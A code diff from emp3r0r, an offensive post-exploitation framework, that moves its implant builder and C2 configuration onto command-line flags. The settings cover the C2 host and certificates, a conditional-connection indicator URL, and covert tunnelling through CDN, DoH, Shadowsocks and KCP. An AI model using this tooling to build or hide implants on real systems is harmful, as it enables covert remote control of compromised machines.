@@ -8,13 +8,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"strconv"
 	"strings"
 	"time"
 
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/spf13/cobra"
 )
 
 const (
@@ -60,32 +60,21 @@ var Arch_List_All = []string{
 	"riscv64",
 }
 
-func modGenAgent() {
-	var (
-		outfile     string // write agent binary to this path
-		arch_choice string // CPU architecture
-	)
-	now := time.Now()
-	stubFile := ""
-	payloadTypeOpt, ok := CurrentModuleOptions["payload_type"]
-	if !ok {
-		LogError("Option 'type' not found")
-		return
-	}
-	payload_type := payloadTypeOpt.Val
+func GenerateAgent(cmd *cobra.Command, args []string) {
+	var outfile string // write agent binary to this path
 
-	archOpt, ok := CurrentModuleOptions["arch"]
-	if !ok {
-		LogError("Option 'arch' not found")
-		return
-	}
-	arch_choice = archOpt.Val
+	// check if we have all required options
+	payload_type, _ := cmd.Flags().GetString("type")
+	arch_choice, _ := cmd.Flags().GetString("arch")
 
 	if !isArchValid(payload_type, arch_choice) {
 		LogError("Invalid arch choice")
 		return
 	}
 
+	// file paths
+	now := time.Now()
+	stubFile := ""
 	stubFile, outfile = generateFilePaths(payload_type, arch_choice, now)
 
 	// is this stub file available?
@@ -95,7 +84,7 @@ func modGenAgent() {
 	}
 
 	// fill emp3r0r.json
-	if err := MakeConfig(); err != nil {
+	if err := MakeConfig(cmd); err != nil {
 		LogError("Failed to configure agent: %v", err)
 		return
 	}
@@ -249,32 +238,37 @@ func appendConfigToPayload(file string, sep, config []byte) (err error) {
 	return
 }
 
-func MakeConfig() (err error) {
+func MakeConfig(cmd *cobra.Command) (err error) {
+	cc_host, _ := cmd.Flags().GetString("cc")
+	indicator_url, _ := cmd.Flags().GetString("indicator")
+	indicator_wait_min, _ := cmd.Flags().GetInt("indicator-wait-min")
+	indicator_wait_max, _ := cmd.Flags().GetInt("indicator-wait-max")
+	cdn_proxy, _ := cmd.Flags().GetString("cdn")
+	c2transport_proxy, _ := cmd.Flags().GetString("proxy")
+	doh_server, _ := cmd.Flags().GetString("doh")
+	proxy_chain, _ := cmd.Flags().GetBool("proxychain")
+	ncsi, _ := cmd.Flags().GetBool("ncsi")
+	shadowsocks, _ := cmd.Flags().GetBool("shadowsocks")
+	kcp, _ := cmd.Flags().GetBool("kcp")
+
 	// read existing config when possible
-	var (
-		jsonData   []byte
-		config_map map[string]interface{}
-	)
+	var config_map map[string]interface{}
 	if util.IsExist(EmpConfigFile) {
 		LogInfo("Reading config from existing %s", EmpConfigFile)
-		jsonData, err = os.ReadFile(EmpConfigFile)
+		jsonData, err := os.ReadFile(EmpConfigFile)
 		if err != nil {
-			LogWarning("failed to read %s: %v", EmpConfigFile, err)
+			return fmt.Errorf("failed to read %s: %v", EmpConfigFile, err)
 		}
 		// load to map
 		err = json.Unmarshal(jsonData, &config_map)
 		if err != nil {
-			LogWarning("Parsing existing %s: %v", EmpConfigFile, err)
+			return fmt.Errorf("parsing existing %s: %v", EmpConfigFile, err)
 		}
 	}
 
 	// CC names and certs
-	ccHostOpt, ok := CurrentModuleOptions["cc_host"]
-	if !ok {
-		LogError("Option 'cc_host' not found")
-		return fmt.Errorf("option 'cc_host' not found")
-	}
-	RuntimeConfig.CCHost = ccHostOpt.Val
+	RuntimeConfig.CCHost = cc_host
+	LogMsg("C2 server name: %s", RuntimeConfig.CCHost)
 	existing_names := tun.NamesInCert(ServerCrtFile)
 	cc_hosts := existing_names
 	exists := false
@@ -294,18 +288,18 @@ func MakeConfig() (err error) {
 		os.RemoveAll(ServerKeyFile)
 		err = GenC2Certs(cc_hosts)
 		if err != nil {
-			return fmt.Errorf("GenAgent: failed to generate certs: %v", err)
+			return fmt.Errorf("failed to generate certs: %v", err)
 		}
 		err = EmpTLSServer.Shutdown(EmpTLSServerCtx)
 		if err != nil {
-			LogError("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
+			return fmt.Errorf("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
 				err, RuntimeConfig.CCHost)
 		} else {
 			LogWarning("Restarting C2 TLS service at port %s to apply new server cert", RuntimeConfig.CCPort)
 
 			c2_names := tun.NamesInCert(ServerCrtFile)
 			if len(c2_names) <= 0 {
-				LogFatal("C2 has no names?")
+				return fmt.Errorf("no valid host names in server cert")
 			}
 			name_list := strings.Join(c2_names, ", ")
 			LogInfo("Updated C2 server names: %s", name_list)
@@ -314,54 +308,50 @@ func MakeConfig() (err error) {
 	}
 
 	// CC indicator
-	ccIndicatorOpt, ok := CurrentModuleOptions["cc_indicator"]
-	if !ok {
-		LogError("Option 'cc_indicator' not found")
-		return fmt.Errorf("option 'cc_indicator' not found")
-	}
-	RuntimeConfig.CCIndicator = ccIndicatorOpt.Val
-
-	indicatorTextOpt, ok := CurrentModuleOptions["indicator_text"]
-	if !ok {
-		LogError("Option 'indicator_text' not found")
-		return fmt.Errorf("option 'indicator_text' not found")
-	}
-	RuntimeConfig.CCIndicatorText = indicatorTextOpt.Val
-	if RuntimeConfig.CCIndicatorText != "" {
-		LogMsg("Remember to put text %s in your indicator (%s) response",
-			strconv.Quote(RuntimeConfig.CCIndicatorText), RuntimeConfig.CCIndicator)
+	RuntimeConfig.CCIndicatorURL = indicator_url
+	if RuntimeConfig.CCIndicatorURL != "" {
+		RuntimeConfig.IndicatorWaitMin = indicator_wait_min
+		RuntimeConfig.IndicatorWaitMax = indicator_wait_max
+		LogMsg("Remember to enable your indicator at %s. Agents will wait between %d to %d seconds for conditional C2 connection",
+			RuntimeConfig.CCIndicatorURL, RuntimeConfig.IndicatorWaitMin, RuntimeConfig.IndicatorWaitMax)
 	}
 
-	ncsiOpt, ok := CurrentModuleOptions["ncsi"]
-	if !ok {
-		LogError("Option 'ncsi' not found")
-		return fmt.Errorf("option 'ncsi' not found")
-	}
-	if ncsiOpt.Val == "on" {
-		RuntimeConfig.DisableNCSI = false
-	} else {
-		RuntimeConfig.DisableNCSI = true
+	// Internet check
+	RuntimeConfig.EnableNCSI = ncsi
+	if RuntimeConfig.EnableNCSI {
+		LogMsg("NCSI is enabled")
 	}
 
 	// CDN proxy
-	RuntimeConfig.CDNProxy = CurrentModuleOptions["cdn_proxy"].Val
+	RuntimeConfig.CDNProxy = cdn_proxy
+	if RuntimeConfig.CDNProxy != "" {
+		LogMsg("Using CDN proxy %s", RuntimeConfig.CDNProxy)
+	}
 
 	// shadowsocks and kcp
-	RuntimeConfig.UseShadowsocks = CurrentModuleOptions["shadowsocks"].Val == "on" || CurrentModuleOptions["shadowsocks"].Val == "bare"
-	RuntimeConfig.UseKCP = CurrentModuleOptions["shadowsocks"].Val != "bare" && RuntimeConfig.UseShadowsocks
+	RuntimeConfig.UseShadowsocks = shadowsocks
+	if shadowsocks {
+		LogMsg("Using Shadowsocks")
+	}
+	RuntimeConfig.UseKCP = kcp
+	if kcp {
+		RuntimeConfig.UseShadowsocks = true
+		LogMsg("Using KCP")
+	}
 
 	// agent proxy for c2 transport
-	RuntimeConfig.C2TransportProxy = CurrentModuleOptions["c2transport_proxy"].Val
-	RuntimeConfig.AutoProxyTimeout, err = strconv.Atoi(CurrentModuleOptions["autoproxy_timeout"].Val)
-	if err != nil {
-		LogWarning("Parsing autoproxy_timeout: %v. Setting to 0.", err)
-		RuntimeConfig.AutoProxyTimeout = 0
+	RuntimeConfig.C2TransportProxy = c2transport_proxy
+	if RuntimeConfig.C2TransportProxy != "" {
+		LogMsg("Using C2 transport proxy %s", RuntimeConfig.C2TransportProxy)
 	}
-	RuntimeConfig.DoHServer = CurrentModuleOptions["doh_server"].Val
-	if CurrentModuleOptions["auto_proxy"].Val == "on" {
-		RuntimeConfig.BroadcastIntervalMax = 120
-	} else {
+
+	RuntimeConfig.DoHServer = doh_server
+	if RuntimeConfig.DoHServer != "" {
+		LogMsg("Using DoH server %s", RuntimeConfig.DoHServer)
+	}
+	if !proxy_chain {
 		RuntimeConfig.BroadcastIntervalMax = 0
+		LogMsg("Proxy chain is disabled")
 	}
 
 	// save emp3r0r.json
